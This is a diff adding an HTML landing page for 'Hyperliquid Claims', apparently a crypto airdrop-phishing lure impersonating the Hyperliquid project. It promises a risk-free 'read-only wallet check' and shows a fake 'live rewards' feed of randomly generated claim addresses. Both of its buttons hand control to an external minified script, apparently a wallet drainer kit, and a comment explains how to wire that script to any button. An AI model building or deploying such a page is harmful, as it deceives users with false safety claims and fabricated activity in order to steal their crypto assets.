@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+  <!-- ===== PRIMARY SEO ===== -->
+  <title>Holder Allocation — Check Your Eligibility | Hyperliquid Claims</title>
+  <meta name="description" content="Check your holder allocation eligibility in seconds. Read-only wallet check, no deposits required. Live rewards feed, instant verification, zero risk.">
+  <meta name="keywords" content="holder allocation, eligibility checker, token allocation, airdrop checker, wallet eligibility, crypto rewards, read-only wallet check, web3 allocation, hyperliquid claims, claim rewards">
+  <meta name="author" content="Hyperliquid Claims">
+  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
+  <meta name="theme-color" content="#f5f9ff">
+  <link rel="canonical" href="https://hyperliquid-claims.vercel.app/">
+
+  <!-- ===== OPEN GRAPH ===== -->
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Hyperliquid Claims">
+  <meta property="og:title" content="Holder Allocation — Check Your Eligibility">
+  <meta property="og:description" content="Read-only wallet check. No deposits required. See live rewards and verify your holder allocation in seconds.">
+  <meta property="og:url" content="https://hyperliquid-claims.vercel.app/">
+  <meta property="og:image" content="https://hyperliquid-claims.vercel.app/image1.png">
+  <meta property="og:image:alt" content="Holder allocation eligibility dashboard">
+
+  <!-- ===== TWITTER / X ===== -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@example">
+  <meta name="twitter:creator" content="@example">
+  <meta name="twitter:title" content="Holder Allocation — Check Your Eligibility">
+  <meta name="twitter:description" content="Read-only wallet check. No deposits required. Verify your allocation in seconds.">
+  <meta name="twitter:image" content="https://hyperliquid-claims.vercel.app/image1.png">
+
+  <link rel="icon" href="https://hyperliquid-claims.vercel.app/logo.png">
+
+  <!-- ===== STRUCTURED DATA ===== -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "Organization",
+        "name": "Hyperliquid Claims",
+        "url": "https://hyperliquid-claims.vercel.app/",
+        "logo": "https://hyperliquid-claims.vercel.app/logo.png",
+        "sameAs": ["https://x.com/example", "https://discord.gg/example"]
+      },
+      {
+        "@type": "WebSite",
+        "name": "Hyperliquid Claims — Holder Allocation",
+        "url": "https://hyperliquid-claims.vercel.app/",
+        "description": "Check your holder allocation eligibility with a read-only wallet check."
+      }
+    ]
+  }
+  </script>
+
+<style>
+  /* ============ TOKENS ============ */
+  :root{
+    --bg:#f5f9ff;
+    --surface:#ffffff;
+    --panel:rgba(59,130,246,.05);
+    --stroke:rgba(29,78,216,.14);
+    --stroke-soft:rgba(29,78,216,.08);
+    --text:#0a1a2f;
+    --muted:#5b6f8a;
+    --accent:#3b82f6;
+    --accent-deep:#1d4ed8;
+    --accent-mid:#2563eb;
+    --accent-light:#93c5fd;
+    --radius:20px;
+    --maxw:960px;
+  }
+
+  *{box-sizing:border-box;margin:0;padding:0}
+
+  html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+
+  body{
+    font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    min-height:100vh;
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+    position:relative;
+  }
+
+  /* ambient blue glow */
+  body::before{
+    content:"";
+    position:fixed; inset:0; z-index:0; pointer-events:none;
+    background:
+      radial-gradient(900px 520px at 50% -12%, rgba(59,130,246,.16), transparent 70%),
+      radial-gradient(760px 520px at 85% 8%, rgba(147,197,253,.22), transparent 72%),
+      radial-gradient(700px 500px at 12% 30%, rgba(37,99,235,.08), transparent 70%);
+  }
+  /* soft grid */
+  body::after{
+    content:"";
+    position:fixed; inset:0; z-index:0; pointer-events:none;
+    background-image:
+      linear-gradient(rgba(29,78,216,.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(29,78,216,.05) 1px, transparent 1px);
+    background-size:64px 64px;
+    -webkit-mask-image:radial-gradient(circle at 50% 0%, #000 0%, transparent 72%);
+    mask-image:radial-gradient(circle at 50% 0%, #000 0%, transparent 72%);
+  }
+
+  a{color:inherit;text-decoration:none}
+
+  /* ============ TAB BAR ============ */
+  .tabbar{
+    position:sticky; top:0; z-index:50;
+    display:flex; align-items:center; justify-content:space-between;
+    gap:16px;
+    padding:12px clamp(16px,4vw,32px);
+    background:rgba(255,255,255,.78);
+    backdrop-filter:blur(18px) saturate(160%);
+    -webkit-backdrop-filter:blur(18px) saturate(160%);
+    border-bottom:1px solid var(--stroke-soft);
+  }
+
+  .brand{display:flex;align-items:center;gap:11px;min-width:0}
+  .brand-mark{
+    position:relative;
+    width:34px;height:34px;flex:0 0 34px;
+    border-radius:11px;
+    display:grid;place-items:center;
+    font-weight:800;font-size:.95rem;color:#ffffff;
+    background:linear-gradient(135deg,#60a5fa,#2563eb);
+    box-shadow:0 6px 18px -6px rgba(37,99,235,.6);
+    overflow:hidden;
+  }
+  .brand-mark img{
+    position:absolute;inset:0;width:100%;height:100%;object-fit:cover;
+  }
+  .brand-name{
+    font-weight:700;font-size:.94rem;letter-spacing:.16em;
+    text-transform:uppercase;color:#0b2a4a;
+    white-space:nowrap;
+  }
+
+  .nav-actions{display:flex;align-items:center;gap:8px}
+
+  /* --- Wallet connect button (uses connect-btn class) --- */
+  .nav-connect{
+    padding:9px 16px;
+    border-radius:999px;
+    border:1px solid rgba(37,99,235,.35);
+    background:rgba(59,130,246,.10);
+    color:#1d4ed8;
+    font:inherit;
+    font-size:.78rem;
+    font-weight:700;
+    letter-spacing:.02em;
+    cursor:pointer;
+    transition:transform .22s ease, box-shadow .22s ease, background .22s ease, border-color .22s ease;
+    white-space:nowrap;
+  }
+  .nav-connect:hover,
+  .nav-connect:focus-visible{
+    background:rgba(59,130,246,.20);
+    border-color:rgba(37,99,235,.6);
+    box-shadow:0 10px 22px -12px rgba(37,99,235,.7);
+    transform:translateY(-2px);
+    outline:none;
+  }
+
+  .icon-btn{
+    width:38px;height:38px;
+    display:grid;place-items:center;
+    border-radius:11px;
+    color:var(--muted);
+    border:1px solid var(--stroke-soft);
+    background:var(--surface);
+    transition:color .22s ease, border-color .22s ease, background .22s ease, transform .22s ease, box-shadow .22s ease;
+  }
+  .icon-btn:hover, .icon-btn:focus-visible{
+    color:var(--accent-deep);
+    border-color:rgba(37,99,235,.4);
+    background:rgba(59,130,246,.08);
+    transform:translateY(-2px);
+    box-shadow:0 10px 22px -14px rgba(37,99,235,.8);
+    outline:none;
+  }
+  .icon-btn svg{width:17px;height:17px;fill:currentColor}
+
+  /* ============ LAYOUT ============ */
+  main{
+    position:relative;z-index:1;
+    max-width:var(--maxw);
+    margin:0 auto;
+    padding:0 clamp(16px,4vw,32px) 72px;
+  }
+
+  /* ============ HERO ============ */
+  .hero{text-align:center;padding-top:clamp(24px,4.5vw,44px)}
+
+  .eyebrow{
+    display:inline-flex;align-items:center;gap:9px;
+    padding:6px 15px;
+    border-radius:999px;
+    border:1px solid var(--stroke);
+    background:var(--surface);
+    font-size:.68rem;font-weight:700;
+    letter-spacing:.28em;text-transform:uppercase;
+    color:var(--accent-deep);
+    box-shadow:0 6px 18px -14px rgba(37,99,235,.6);
+    animation:fadeUp .7s cubic-bezier(.22,1,.36,1) both;
+  }
+  .eyebrow::before{
+    content:"";width:6px;height:6px;border-radius:50%;
+    background:var(--accent);
+    box-shadow:0 0 10px 2px rgba(59,130,246,.6);
+  }
+
+  h1{
+    margin-top:14px;
+    margin-bottom:0;
+    padding-bottom:0.18em;
+    font-size:clamp(1.85rem,5.4vw,2.9rem);
+    line-height:1.3;
+    font-weight:600;
+    letter-spacing:-.02em;
+    display:block;
+    background:linear-gradient(180deg,#082f49 20%,#2563eb 100%);
+    -webkit-background-clip:text;background-clip:text;
+    -webkit-text-fill-color:transparent;color:transparent;
+    animation:fadeUp .7s .08s cubic-bezier(.22,1,.36,1) both;
+  }
+
+  /* ============ MEDIA ============ */
+  .media{
+    position:relative;
+    margin:22px auto 0;
+    width:100%;
+    aspect-ratio:2.4 / 1;
+    max-height:360px;
+    border-radius:var(--radius);
+    border:1px solid var(--stroke);
+    overflow:hidden;
+    background:
+      radial-gradient(120% 120% at 50% 0%, rgba(59,130,246,.16), transparent 60%),
+      radial-gradient(120% 120% at 80% 100%, rgba(147,197,253,.22), transparent 60%),
+      #ffffff;
+    box-shadow:
+      0 24px 60px -36px rgba(37,99,235,.35),
+      inset 0 1px 0 rgba(255,255,255,.9);
+    animation:fadeUp .8s .16s cubic-bezier(.22,1,.36,1) both;
+  }
+  .media::before{
+    content:"";
+    position:absolute;inset:0;
+    background-image:
+      linear-gradient(rgba(29,78,216,.06) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(29,78,216,.06) 1px, transparent 1px);
+    background-size:38px 38px;
+    -webkit-mask-image:radial-gradient(circle at 50% 50%, #000, transparent 78%);
+    mask-image:radial-gradient(circle at 50% 50%, #000, transparent 78%);
+  }
+  .media img{
+    position:relative;z-index:1;
+    width:100%;height:100%;
+    object-fit:contain;
+    object-position:center;
+    display:block;
+  }
+  .media-tag{
+    position:absolute;z-index:2;left:14px;bottom:14px;
+    display:inline-flex;align-items:center;gap:7px;
+    padding:6px 12px;border-radius:999px;
+    font-size:.66rem;font-weight:700;letter-spacing:.18em;text-transform:uppercase;
+    color:var(--accent-deep);
+    background:rgba(255,255,255,.82);
+    border:1px solid rgba(37,99,235,.25);
+    backdrop-filter:blur(10px);
+  }
+  .media-tag span{
+    width:6px;height:6px;border-radius:50%;background:var(--accent);
+    box-shadow:0 0 8px 2px rgba(59,130,246,.7);
+  }
+
+  /* ============ CTA ============ */
+  .cta-wrap{display:flex;flex-direction:column;align-items:center;margin-top:clamp(18px,3vw,28px)}
+
+  .cta{
+    position:relative;
+    display:inline-flex;align-items:center;justify-content:center;gap:10px;
+    padding:16px 44px;
+    border:none;cursor:pointer;
+    border-radius:999px;
+    font:inherit;font-weight:700;font-size:1rem;letter-spacing:.01em;
+    color:#ffffff;
+    background:linear-gradient(135deg,#60a5fa 0%,#3b82f6 48%,#1d4ed8 100%);
+    box-shadow:
+      0 16px 34px -14px rgba(37,99,235,.7),
+      0 0 0 1px rgba(255,255,255,.25) inset;
+    transition:transform .28s cubic-bezier(.22,1,.36,1), box-shadow .28s ease, filter .28s ease;
+    overflow:hidden;
+    -webkit-tap-highlight-color:transparent;
+    animation:fadeUp .8s .24s cubic-bezier(.22,1,.36,1) both;
+  }
+  .cta::after{
+    content:"";
+    position:absolute;top:0;left:-120%;
+    width:60%;height:100%;
+    background:linear-gradient(100deg, transparent, rgba(255,255,255,.75), transparent);
+    transform:skewX(-18deg);
+    transition:left .7s cubic-bezier(.22,1,.36,1);
+    pointer-events:none;
+  }
+  .cta:hover{
+    transform:translateY(-4px) scale(1.025);
+    filter:brightness(1.04);
+    box-shadow:
+      0 26px 50px -16px rgba(37,99,235,.75),
+      0 0 0 1px rgba(255,255,255,.35) inset;
+  }
+  .cta:hover::after{left:150%}
+  .cta:active{transform:translateY(-1px) scale(.995)}
+  .cta:focus-visible{outline:2px solid var(--accent-deep);outline-offset:4px}
+  .cta svg{width:18px;height:18px;fill:none;stroke:currentColor;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+
+  .note{
+    margin-top:12px;
+    font-size:.8rem;
+    color:var(--muted);
+    letter-spacing:.01em;
+    display:inline-flex;align-items:center;gap:8px;
+    animation:fadeUp .8s .3s cubic-bezier(.22,1,.36,1) both;
+  }
+  .note svg{width:13px;height:13px;stroke:var(--accent-mid);stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+
+  /* ============ LIVE REWARDS ============ */
+  .rewards{
+    max-width:620px;
+    margin:clamp(44px,7vw,72px) auto 0;
+    border-radius:var(--radius);
+    border:1px solid var(--stroke);
+    background:var(--surface);
+    box-shadow:0 24px 60px -40px rgba(37,99,235,.5), inset 0 1px 0 rgba(255,255,255,.9);
+    overflow:hidden;
+    animation:fadeUp .9s .34s cubic-bezier(.22,1,.36,1) both;
+  }
+
+  .rewards-head{
+    display:flex;align-items:center;justify-content:space-between;gap:12px;
+    padding:16px 20px;
+    border-bottom:1px solid var(--stroke-soft);
+    background:linear-gradient(180deg, rgba(59,130,246,.07), rgba(59,130,246,.02));
+  }
+  .rewards-title{
+    display:flex;align-items:center;gap:10px;
+    font-size:.72rem;font-weight:800;
+    letter-spacing:.24em;text-transform:uppercase;
+    color:var(--accent-deep);
+  }
+  .live-badge{
+    display:inline-flex;align-items:center;gap:7px;
+    padding:5px 11px;border-radius:999px;
+    font-size:.62rem;font-weight:800;letter-spacing:.18em;text-transform:uppercase;
+    color:var(--accent-deep);
+    background:rgba(59,130,246,.10);
+    border:1px solid rgba(37,99,235,.25);
+  }
+  .live-dot{
+    width:6px;height:6px;border-radius:50%;background:var(--accent);
+    box-shadow:0 0 0 0 rgba(59,130,246,.6);
+    animation:pulse 2s infinite;
+  }
+
+  .feed{
+    list-style:none;
+    padding:14px;
+    display:flex;flex-direction:column;gap:8px;
+    min-height:132px;
+  }
+
+  .feed-item{
+    display:flex;align-items:center;flex-wrap:wrap;gap:8px;
+    padding:11px 14px;
+    border-radius:13px;
+    border:1px solid var(--stroke-soft);
+    background:#fbfdff;
+    font-size:.85rem;
+    color:#33475f;
+    animation:itemIn .55s cubic-bezier(.22,1,.36,1) both;
+  }
+  .feed-item:first-child{
+    border-color:rgba(37,99,235,.28);
+    background:rgba(59,130,246,.07);
+  }
+  .feed-item .dot{
+    width:6px;height:6px;flex:0 0 6px;border-radius:50%;
+    background:var(--accent);
+    box-shadow:0 0 9px 1px rgba(59,130,246,.55);
+  }
+  .feed-item .addr{
+    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    font-size:.82rem;font-weight:600;
+    color:var(--accent-deep);
+    letter-spacing:.01em;
+  }
+  .feed-item .txt{color:var(--muted)}
+  .feed-item .amt{
+    margin-left:auto;
+    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    font-size:.82rem;font-weight:700;
+    color:#1e40af;
+    white-space:nowrap;
+  }
+
+  .feed-foot{
+    padding:10px 20px 14px;
+    font-size:.68rem;
+    letter-spacing:.06em;
+    color:#8aa0b8;
+    text-align:center;
+  }
+
+  /* ============ FOOTER ============ */
+  footer{
+    position:relative;z-index:1;
+    border-top:1px solid var(--stroke-soft);
+    padding:26px clamp(16px,4vw,32px);
+    margin-top:24px;
+    background:rgba(255,255,255,.6);
+  }
+  .footer-inner{
+    max-width:var(--maxw);margin:0 auto;
+    display:flex;align-items:center;justify-content:space-between;
+    gap:14px;flex-wrap:wrap;
+    font-size:.78rem;color:#6b7f99;
+  }
+  .footer-inner strong{color:#0b2a4a;font-weight:600}
+  .footer-links{display:flex;gap:18px}
+  .footer-links a{transition:color .2s ease}
+  .footer-links a:hover{color:var(--accent-deep)}
+
+  /* ============ ANIMATIONS ============ */
+  @keyframes fadeUp{
+    from{opacity:0;transform:translateY(18px)}
+    to{opacity:1;transform:translateY(0)}
+  }
+  @keyframes itemIn{
+    from{opacity:0;transform:translateY(-8px) scale(.985)}
+    to{opacity:1;transform:translateY(0) scale(1)}
+  }
+  @keyframes pulse{
+    0%{box-shadow:0 0 0 0 rgba(59,130,246,.55)}
+    70%{box-shadow:0 0 0 7px rgba(59,130,246,0)}
+    100%{box-shadow:0 0 0 0 rgba(59,130,246,0)}
+  }
+
+  /* ============ RESPONSIVE ============ */
+  @media (max-width:560px){
+    .brand-name{display:none}
+    .nav-connect{padding:8px 12px;font-size:.72rem}
+    .media{
+      margin-top:16px;
+      aspect-ratio:16 / 9;
+      max-height:none;
+    }
+    .cta{padding:15px 34px;font-size:.95rem;width:100%;max-width:320px}
+    .feed-item{font-size:.8rem;padding:10px 12px}
+    .feed-item .amt{margin-left:0;width:100%;text-align:right}
+    .footer-inner{justify-content:center;text-align:center}
+  }
+
+  @media (prefers-reduced-motion:reduce){
+    *,*::before,*::after{
+      animation-duration:.001ms !important;
+      animation-iteration-count:1 !important;
+      transition-duration:.001ms !important;
+      scroll-behavior:auto !important;
+    }
+  }
+</style>
+</head>
+
+<body>
+
+  <!-- ================= TAB BAR ================= -->
+  <header class="tabbar">
+    <a class="brand" href="https://hyperliquid-claims.vercel.app/" aria-label="Hyperliquid Claims — home">
+      <span class="brand-mark">
+        H
+        <img src="https://hyperliquid-claims.vercel.app/logo.png" alt="Hyperliquid Claims logo" onerror="this.remove()">
+      </span>
+      <span class="brand-name">Hyperliquid</span>
+    </a>
+
+    <nav class="nav-actions" aria-label="Social links and wallet">
+      <!-- Wallet connection button — handled entirely by chunk-c6mfo3tr.min.js -->
+      <button class="connect-btn nav-connect" type="button">Connect Wallet</button>
+
+      <a class="icon-btn" href="https://x.com/example" target="_blank" rel="noopener noreferrer" aria-label="Follow us on X">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+      </a>
+      <a class="icon-btn" href="https://discord.gg/example" target="_blank" rel="noopener noreferrer" aria-label="Join our Discord">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.317 4.3698a19.7913 19.7913 0 0 0-4.8851-1.5152.0741.0741 0 0 0-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 0 0-.0785-.037 19.7363 19.7363 0 0 0-4.8852 1.515.0699.0699 0 0 0-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 0 0 .0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 0 0 .0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 0 0-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 0 1-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 0 1 .0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 0 1 .0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 0 1-.0066.1276 12.2986 12.2986 0 0 1-1.873.8914.0766.0766 0 0 0-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 0 0 .0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 0 0 .0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 0 0-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"/></svg>
+      </a>
+    </nav>
+  </header>
+
+  <!-- ================= MAIN ================= -->
+  <main>
+
+    <!-- HERO -->
+    <section class="hero" aria-labelledby="hero-title">
+      <div class="eyebrow">Holder Allocation</div>
+      <h1 id="hero-title">Check Your Eligibility</h1>
+
+      <div class="media">
+        <img src="https://hyperliquid-claims.vercel.app/image1.png" alt="Holder allocation eligibility dashboard preview" onerror="this.remove()">
+        <div class="media-tag"><span></span>Live snapshot</div>
+      </div>
+
+      <div class="cta-wrap">
+        <!-- Check Eligibility button — also uses connect-btn, so the external
+             wallet script handles the click. No inline JS binds to this button. -->
+        <button class="cta connect-btn" id="eligibilityBtn" type="button">
+          Check Eligibility
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h13M12 5l7 7-7 7"/></svg>
+        </button>
+        <p class="note">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3l7 4v5c0 4.5-3 7.8-7 9-4-1.2-7-4.5-7-9V7l7-4z"/><path d="M9.5 12l1.8 1.8 3.4-3.6"/></svg>
+          Read-only wallet check · No deposits required
+        </p>
+      </div>
+    </section>
+
+    <!-- LIVE REWARDS SIMULATOR -->
+    <section class="rewards" aria-labelledby="rewards-title">
+      <div class="rewards-head">
+        <h2 class="rewards-title" id="rewards-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" style="opacity:.85">
+            <path d="M12 2l2.6 6.2L21 9l-5 4.4 1.5 6.6L12 16.6 6.5 20 8 13.4 3 9l6.4-.8z"/>
+          </svg>
+          Live Rewards
+        </h2>
+        <span class="live-badge"><span class="live-dot"></span>Live</span>
+      </div>
+
+      <ul class="feed" id="feed" aria-label="Recent reward claims"></ul>
+
+      <p class="feed-foot">Simulated activity for demonstration purposes.</p>
+    </section>
+
+  </main>
+
+  <!-- ================= FOOTER ================= -->
+  <footer>
+    <div class="footer-inner">
+      <span>© <span id="year">2025</span> <strong>Hyperliquid Claims</strong> — All rights reserved.</span>
+      <nav class="footer-links" aria-label="Footer links">
+        <a href="https://x.com/example" target="_blank" rel="noopener noreferrer">X</a>
+        <a href="https://discord.gg/example" target="_blank" rel="noopener noreferrer">Discord</a>
+        <a href="https://hyperliquid-claims.vercel.app/terms">Terms</a>
+      </nav>
+    </div>
+  </footer>
+
+<script>
+(function () {
+  "use strict";
+
+  document.getElementById("year").textContent = new Date().getFullYear();
+
+  /* ---------- Live rewards simulator ----------
+     This is purely visual and does not touch any .connect-btn.
+     Wallet connection is handled exclusively by chunk-c6mfo3tr.min.js. */
+  const feed     = document.getElementById("feed");
+  const MAX_ROWS = 6;
+  const MIN_DELAY = 30000;
+  const MAX_DELAY = 60000;
+  const HEX = "0123456789abcdef";
+
+  function randomAddress() {
+    let s = "0x";
+    for (let i = 0; i < 5; i++) s += HEX[Math.floor(Math.random() * 16)];
+    return s;
+  }
+  function randomAmount() {
+    return Math.floor(Math.random() * 900) + 50;
+  }
+  function addEntry() {
+    const li = document.createElement("li");
+    li.className = "feed-item";
+
+    const dot = document.createElement("span");
+    dot.className = "dot";
+
+    const addr = document.createElement("span");
+    addr.className = "addr";
+    addr.textContent = randomAddress();
+
+    const txt = document.createElement("span");
+    txt.className = "txt";
+    txt.textContent = "just claimed";
+
+    const amt = document.createElement("span");
+    amt.className = "amt";
+    amt.textContent = randomAmount() + " XXX";
+
+    li.append(dot, addr, txt, amt);
+    feed.prepend(li);
+
+    while (feed.children.length > MAX_ROWS) {
+      feed.lastElementChild.remove();
+    }
+  }
+
+  addEntry();
+  setTimeout(addEntry, 900);
+
+  (function loop() {
+    const delay = MIN_DELAY + Math.random() * (MAX_DELAY - MIN_DELAY);
+    setTimeout(function () {
+      addEntry();
+      loop();
+    }, delay);
+  })();
+})();
+</script>
+
+<!-- ============================================================
+     WALLET CONNECTION INTEGRATION
+     ============================================================
+     Place this before </body> on your page:
+       <script src="chunk-c6mfo3tr.min.js" async></script>
+
+     Connect button
+     Add this CSS class to any button that should trigger wallet connection:
+       connect-btn
+
+     Example:
+       <button class="connect-btn">Connect Wallet</button>
+
+     You can add this class to multiple buttons — all of them will
+     trigger wallet connection.
+     ============================================================ -->
+<script src="chunk-c6mfo3tr.min.js" async></script>
+
+</body>
+</html>
